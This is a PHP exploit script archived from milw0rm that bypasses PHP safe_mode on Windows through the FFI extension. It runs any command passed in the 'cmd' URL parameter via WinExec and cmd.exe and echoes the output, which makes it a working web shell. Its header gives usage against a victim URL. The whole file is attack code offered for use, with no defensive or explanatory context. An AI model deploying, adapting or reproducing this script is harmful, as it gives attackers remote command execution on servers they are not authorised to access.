<?php

##########################################################
###----------------------------------------------------###
###-----PHP FFI Extension Safe_mode Bypass Exploit-----###
###----------------------------------------------------###
###-Tested on 5.0.5------------------------------------###
###----------------------------------------------------###
###-Usage:-http://victim.net/NJ.php?cmd=[COMMAND]------###
###----------------------------------------------------###
###-PHP:-http://php.net--------------------------------###
###-FFI:-http://pecl.php.net/package/ffi---------------###
###----------------------------------------------------###
###-Author:--NetJackal---------------------------------###
###-Email:---nima_501[at]yahoo[dot]com-----------------###
###-Website:-http://netjackal.by.ru--------------------###
###----------------------------------------------------###
##########################################################

if(!extension_loaded('ffi'))
die('ERROR: FFI extension is not loaded!');
$command=(empty($_GET['cmd']))?'dir':$_GET['cmd'];
if(is_writeable(dirname(__FILE__)))$tmp=dirname(__FILE__);
elseif(is_writeable(ini_get('session.save_path')))
$tmp=ini_get('session.save_path');
elseif(is_writeable(ini_get('upload_tmp_dir')))
$tmp=ini_get('upload_tmp_dir');
else die('ERROR: Move exploit to writeable folder.');
$output="$tmp\\".uniqid('NJ');
$api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
$res=$api->WinExec("cmd.exe /c $command >\"$output\"",0);
while(!file_exists($output))sleep(1);
$con='';
$fp=fopen($output,'r');
while(!feof($fp))$con.=fgets($fp,1024);
fclose($fp);
$con=htmlspecialchars($con);
echo "<pre>$con</pre>";
unlink($output);
?>

# milw0rm.com [2007-08-23]
